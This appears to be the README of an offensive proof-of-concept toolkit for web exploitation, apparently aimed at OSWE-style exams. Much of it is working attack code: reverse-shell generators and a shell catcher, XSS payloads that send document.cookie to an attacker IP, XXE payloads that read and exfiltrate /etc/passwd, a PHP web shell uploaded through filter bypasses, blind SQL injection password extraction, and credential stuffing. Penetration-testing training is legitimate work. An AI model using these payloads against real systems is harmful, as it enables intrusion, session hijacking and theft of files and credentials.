# POC Utils Quick Reference

Quick reference for all utilities included in this POC template. These are designed for **speed and simplicity** in security research.

## Colored Output (`utils/output.py`)

Better visibility for your exploit output:

```python
from utils.output import out

out.success("Target vulnerable!")      # [+] Green
out.error("Connection failed")         # [-] Red
out.info("Starting exploit")           # [*] Blue
out.warning("Default creds")           # [!] Yellow
out.status("Extracting data...")       # [...] Cyan
out.debug("Response: 200 OK")          # [DEBUG] Magenta
```

## Reverse Shells (`utils/reverse_shells.py`)

Generate reverse shells dynamically with proper LHOST/LPORT:

```python
from utils.reverse_shells import *

# Generate shell files (written to payloads/shells/)
path = bash_shell("10.10.14.5", 4444)           # Returns: "shells/rev_bash.sh"
path = python_shell("10.10.14.5", 4444)         # Returns: "shells/rev_python.py"
path = powershell_shell("10.10.14.5", 4444)     # Returns: "shells/rev_powershell.ps1"

# Get one-liners (no file written)
cmd = python_oneliner("10.10.14.5", 4444)       # For direct RCE
cmd = powershell_oneliner("10.10.14.5", 4444)   # For Windows

# Quick helpers with instructions
quick_bash(args.lhost, 4444)     # Prints curl/wget commands
quick_python(args.lhost, 4444)   # Prints download instructions
```

Serve shells at: `http://YOUR-IP:8000/shells/rev_bash.sh`

## Shell Catcher (`utils/shell_catcher.py`)

Catch reverse shells directly in Python - no need for separate netcat!

```python
from utils.shell_catcher import ShellCatcher, auto_shell, quick_catch

# Method 1: Full control
catcher = ShellCatcher(4444)
catcher.start()                          # Start listener
trigger_exploit()                         # Your RCE
if catcher.wait_for_shell(timeout=30):   # Wait for connection
    catcher.stabilize()                   # Upgrade to PTY (automatic terminal sizing!)
    catcher.interact()                    # Full interactive shell with tab completion!

# Method 2: Context manager (recommended)
with auto_shell(4444) as catcher:
    trigger_exploit()
    if catcher.shell_caught:              # Auto-waits for shell
        catcher.stabilize()
        catcher.interact()                # Auto-uses raw mode after stabilize!

# Method 3: With trigger function
def trigger():
    requests.get(f"http://target/rce?cmd={python_oneliner(lhost, 4444)}")

quick_catch(4444, trigger_func=trigger)   # Does everything automatically
```

**Features:**
- Automatic PTY upgrade with Python/script
- Terminal size detection and setting
- Command history with arrow keys
- Tab completion (after stabilization)
- Raw TTY mode for full interactivity

## Cookie Handling (`utils/cookie.py`)

Parse stolen cookies for reuse:

```python
from utils.cookie import parse_cookie_string
from utils.server_hooks import get_cookie

# Wait for XSS to steal cookie
cookie_str = get_cookie(timeout=30)
# Returns: "session=abc123; token=xyz789"

# Parse for requests
cookies = parse_cookie_string(cookie_str)
# Returns: {'session': 'abc123', 'token': 'xyz789'}

# Use in requests
response = requests.get(target_url, cookies=cookies)
```

## Server Hooks (`utils/server_hooks.py`)

Get data from your callback server's queue:

```python
from utils.server_hooks import get_cookie, wait_for_callback, get_event

# Wait for cookie from XSS
cookie = get_cookie(server='http://localhost:8000', timeout=30)

# Wait for any callback type
data = wait_for_callback(timeout=30, param='cookie')

# Get raw events
event = get_event()  # {'type': 'cookie', 'data': '...', 'timestamp': '...'}

# Clear queue before new attempt
drain_queue()
```

## XSS Payloads (`utils/xss.py`)

Generate XSS payloads with automatic callback integration:

```python
from utils.xss import img_onerror, blind_xss, cookie_stealer, polyglot

# Quick test payload (img tag with onerror)
payload = img_onerror(f"http://{lhost}:8000")
# Returns: <img src=x onerror="fetch('http://10.10.14.5:8000/queue?cookie='+btoa(document.cookie))">

# Blind XSS with full data exfil
payload = blind_xss(f"http://{lhost}:8000", identifier="admin_panel")
# Sends: cookies, localStorage, URL, DOM content

# Polyglot (works in multiple contexts)
payload = polyglot(f"http://{lhost}:8000")

# Context-specific payloads
from utils.xss import context_specific
payload = context_specific(f"http://{lhost}:8000", context="attribute")
# Contexts: html, attribute, js, css

# Get stolen cookie
from utils.server_hooks import get_cookie
send_xss_payload(payload)
cookie = get_cookie(timeout=30)
```

## XXE Payloads (`utils/xxe.py`)

Generate XXE payloads for file reading and SSRF:

```python
from utils.xxe import quick_test, basic_file_read, php_filter_b64

# Quick test (creates DTD + payload automatically)
payload = quick_test(f"http://{lhost}:8000", "/etc/passwd")
# Writes DTD to payloads/xxe/xxe.dtd, returns XML payload

# Basic XXE (file content in response)
payload = basic_file_read("/etc/passwd")

# Read PHP source as base64
payload = php_filter_b64("/var/www/html/config.php")

# Format-specific XXE
from utils.xxe import svg_xxe, soap_xxe
svg_payload = svg_xxe(f"http://{lhost}:8000", "/etc/passwd")
soap_payload = soap_xxe(f"http://{lhost}:8000", "/etc/passwd")

# Get exfiltrated data
from utils.server_hooks import get_exfil
send_xxe_payload(payload)
data = get_exfil(timeout=30)
```

## File Upload (`utils/file_upload.py`)

Upload files with automatic bypass techniques:

```python
from utils.file_upload import FileUploader, quick_upload

# Quick upload with all bypasses
uploader = FileUploader("http://target/upload")
result = uploader.upload_with_bypass(
    "shell.php",
    b"<?php system($_GET['cmd']); ?>",
    techniques=["null_byte", "double_extension", "case_variation"]
)

# Simple upload
result = uploader.upload("shell.php", php_code)

# One-liner
quick_upload("http://target/upload", "shell.php", php_code)
```

**Available bypass techniques:**
- `null_byte`: filename.php%00.jpg
- `double_extension`: filename.jpg.php
- `case_variation`: filename.PHP
- `mime_mismatch`: Send PHP as image/jpeg

## Zip Utilities (`utils/zip_util.py`)

Create and extract zip files (with zip slip protection):

```python
from utils.zip_util import quick_zip, zip_multiple, extract_zip

# Quick zip (auto-detects file or folder)
quick_zip("payloads/", output="payloads.zip")

# Zip multiple files
zip_multiple(
    ["exploit.py", "shell.php", "config.json"],
    output_path="poc.zip"
)

# Extract safely (prevents zip slip)
extract_zip("archive.zip", extract_to="./extracted")
```

## Apache Hooks (`utils/apache_hooks.py`) - OSWE Fallback

**Use this if exam requires Apache2 instead of the built-in server.**

Same API as `server_hooks.py`, but reads from Apache access logs:

```python
from utils.apache_hooks import get_cookie, get_exfil, get_param

# Get cookie from Apache logs (checks both ?cookie= and ?cookies=)
cookie = get_cookie('/var/log/apache2/access.log', timeout=30)
# Auto-decodes base64, returns most recent occurrence

# Get exfiltrated data (looks for ?exfil=)
data = get_exfil('/var/log/apache2/access.log', timeout=30)

# Get any custom parameter
value = get_param('data', '/var/log/apache2/access.log', timeout=30)

# Watch log in real-time (for debugging)
from utils.apache_hooks import watch_log
watch_log('/var/log/apache2/access.log', params=['cookies', 'exfil'])
```

**How it works:**
- Uses regex to find query parameters in Apache logs
- Returns the **most recent** (last) match in the file
- Auto-decodes base64-encoded values
- URL-decodes values automatically

**Quick migration from server_hooks:**
```python
# Development (with built-in server)
from utils.server_hooks import get_cookie

# Exam (with Apache)
from utils.apache_hooks import get_cookie

# Same function calls work with both!
cookie = get_cookie(timeout=30)
```

**CLI watch mode:**
```bash
# Watch logs for interesting parameters
python -m utils.apache_hooks watch
python -m utils.apache_hooks watch /var/log/apache2/access.log cookies exfil data
```

## Paths (`utils/paths.py`)

Consistent access to project directories:

```python
from utils.paths import LOGS_DIR, PAYLOADS_DIR, get_log_file, ensure_dirs_exist

# Get absolute paths
logs = LOGS_DIR           # /path/to/project/logs
payloads = PAYLOADS_DIR   # /path/to/project/payloads

# Ensure all dirs exist
ensure_dirs_exist()

# Get specific log file
server_log = get_log_file('server.ndjson')
```

## Encoding (`utils/encoding.py`)

Common encoding/decoding operations:

```python
from utils.encoding import b64_encode, b64_decode, url_encode, url_decode
from utils.encoding import to_hex, from_hex, html_encode, html_decode

# Base64
encoded = b64_encode("admin:password")
decoded = b64_decode("YWRtaW46cGFzc3dvcmQ=")

# URL encoding
safe = url_encode("../../etc/passwd")
unsafe = url_decode("%2e%2e%2f%2e%2e%2fetc%2fpasswd")

# Hex
hex_str = to_hex("ABCD")           # "41424344"
text = from_hex("41424344")        # "ABCD"

# HTML entities
safe_html = html_encode("<script>")
unsafe = html_decode("&lt;script&gt;")
```

## Network (`utils/network.py`)

Network utilities for callbacks:

```python
from utils.network import get_interfaces, get_callback_host

# Get all network interfaces
interfaces = get_interfaces()
# {'eth0': '10.10.14.5', 'tun0': '10.10.16.2', ...}

# Get best callback IP (prioritizes VPN interfaces)
lhost = get_callback_host()
# Returns: '10.10.16.2' (or best available)
```

## Timing (`utils/timing.py`)

Timing utilities for blind exploitation:

```python
from utils.timing import time_request

# Time a request (useful for blind SQLi)
def attempt(payload):
    return requests.get(f"http://target?id={payload}")

duration = time_request(attempt, "1' AND SLEEP(5)--")
if duration > 5:
    out.success("Vulnerable to time-based SQLi!")
```

## HTML Parser (`utils/html_parser.py`)

Easy BeautifulSoup wrapper for quick HTML parsing:

```python
from utils.html_parser import HTMLParser, quick_parse, parse_response

# Parse from response
parser = HTMLParser.from_response(response)

# Find elements
form = parser.find_by_id("login-form")
inputs = parser.find_all_by_class("form-input")
links = parser.find_links()

# CSRF token extraction
csrf = parser.find_csrf_token()  # Auto-finds common CSRF token names
all_tokens = parser.find_all_csrf_tokens()  # Get all potential tokens

# Form handling
forms = parser.find_forms()
for form in forms:
    data = parser.extract_form_data(form)  # Extract all inputs as dict
    print(f"Action: {form.get('action')}, Data: {data}")

# Quick dumps
parser.dump_forms()  # Print all forms with their data
parser.dump_links()  # Print all links

# CSS selectors
hidden = parser.css_select("input[type='hidden']")
button = parser.css_select_one("#submit-btn")

# Text search
results = parser.search("admin", tag="div")  # Find text in specific tags

# Quick usage
parser = quick_parse(html_string)
csrf = parser.find_csrf_token()
```

## Common POC Patterns

### XSS Cookie Stealer
```python
# 1. Start server to catch callbacks
# python servers/server.py

# 2. Send XSS payload
xss = f"<script>fetch('http://{lhost}:8000/queue?cookie='+document.cookie)</script>"
send_payload(xss)

# 3. Get stolen cookie
from utils.server_hooks import get_cookie
from utils.cookie import parse_cookie_string

cookie_str = get_cookie(timeout=30)
cookies = parse_cookie_string(cookie_str)

# 4. Use stolen session
r = requests.get(target, cookies=cookies)
```

### RCE to Shell
```python
from utils.reverse_shells import python_oneliner
from utils.shell_catcher import auto_shell

# Generate payload
cmd = python_oneliner(lhost, 4444)

with auto_shell(4444) as catcher:
    # Trigger RCE
    requests.post(target, data={'cmd': cmd})

    # Get shell
    if catcher.shell_caught:
        catcher.stabilize()  # Upgrade to PTY
        catcher.interact()   # Full interactive shell!
```

### Blind SQLi Boolean-Based
```python
from utils.output import out
import string

def check(payload):
    r = requests.get(f"http://target?id=1' AND {payload}--")
    return "Welcome" in r.text

# Extract data
password = ""
for pos in range(1, 33):
    for char in string.ascii_letters + string.digits:
        if check(f"SUBSTRING(password,{pos},1)='{char}'"):
            password += char
            out.success(f"Password: {password}")
            break
```

### File Upload to RCE
```python
from utils.reverse_shells import php_shell
from utils.shell_catcher import quick_catch

# Generate PHP shell
shell_path = php_shell(lhost, 4444)

# Upload shell
files = {'upload': open(f'payloads/{shell_path}', 'rb')}
r = requests.post(f"{target}/upload", files=files)

# Trigger and catch
def trigger():
    requests.get(f"{target}/uploads/shell.php")

quick_catch(4444, trigger_func=trigger)
```

## Batch Requests (`utils/batch_request.py`)

Intruder-like functionality for testing multiple payloads:

```python
import httpx
from utils.batch_request import (
    batch_request_sync,
    generate_param_payloads,
    generate_json_payloads,
    generate_data_payloads,
    generate_header_payloads
)

# Build base request with common parameters
client = httpx.Client()
base = client.build_request(
    "POST",
    "http://target/api/login",
    json={"username": "test", "password": "test"},
    headers={"X-API-Key": "secret"}
)

# Test SQL injection
sqli_payloads = ["' OR '1'='1", "admin'--", "' UNION SELECT NULL--"]
results = batch_request_sync(
    base,
    payloads=generate_json_payloads("username", sqli_payloads),
    validate=lambda r: "dashboard" in r.text or r.status_code == 302,
    concurrency=5,  # 5 requests at a time
    proxy="http://127.0.0.1:8080"  # Debug via Burp
)

# Find successful payloads
for r in results:
    if r.matched:
        out.success(f"Valid payload: {r.payload}")

# Enumerate IDs
results = batch_request_sync(
    client.build_request("GET", "http://target/api/user"),
    payloads=generate_param_payloads("id", range(1, 1000)),
    validate=lambda r: r.status_code == 200,
    concurrency=50  # Fast enumeration
)

# Credential stuffing
creds = [
    {"username": "admin", "password": "admin"},
    {"username": "root", "password": "root"},
]
results = batch_request_sync(
    base,
    payloads=[{"json": cred} for cred in creds],
    validate=lambda r: "success" in r.text,
    concurrency=3  # Be gentle with login endpoints
)

# Header injection testing
results = batch_request_sync(
    client.build_request("GET", "http://target/"),
    payloads=generate_header_payloads("X-Forwarded-For",
                                     ["127.0.0.1", "localhost", "::1"]),
    validate=lambda r: "admin" in r.text
)

# Memory-efficient scanning (for large wordlists)
with open("wordlist.txt") as f:
    wordlist = [line.strip() for line in f]

# Only get successful results, drop response bodies
valid_users = batch_request_sync(
    client.build_request("GET", "http://target/api/user"),
    payloads=generate_param_payloads("username", wordlist),
    validate=lambda r: r.status_code == 200,
    concurrency=100,
    filter_matched=True,  # Only return valid usernames
    drop_response=True    # Don't store response bodies (saves memory)
)

# Now valid_users only contains successful payloads
for result in valid_users:
    out.success(f"Valid user: {result.payload['params']['username']}")
```

## Tips

1. **Always use colored output** - Makes exploits much easier to debug
2. **Use shell_catcher** instead of netcat - Get PTY upgrade automatically
3. **Generate shells on-demand** - Don't hardcode LHOST/LPORT
4. **Keep it simple** - These utils prioritize speed over perfection
5. **Use batch_request for fuzzing** - Test multiple payloads efficiently with concurrency control

## Quick Start Checklist

```bash
# 1. Start your server (in separate terminal)
python servers/server.py

# 2. Run your exploit
python exploit.py --target http://victim.com --lhost YOUR-IP

# 3. Common imports for any POC
from utils.output import out
from utils.shell_catcher import auto_shell
from utils.reverse_shells import python_oneliner
from utils.server_hooks import get_cookie
from utils.cookie import parse_cookie_string
```

Remember: This is for **quick and dirty POCs**. Make it work, make it fast, keep it simple!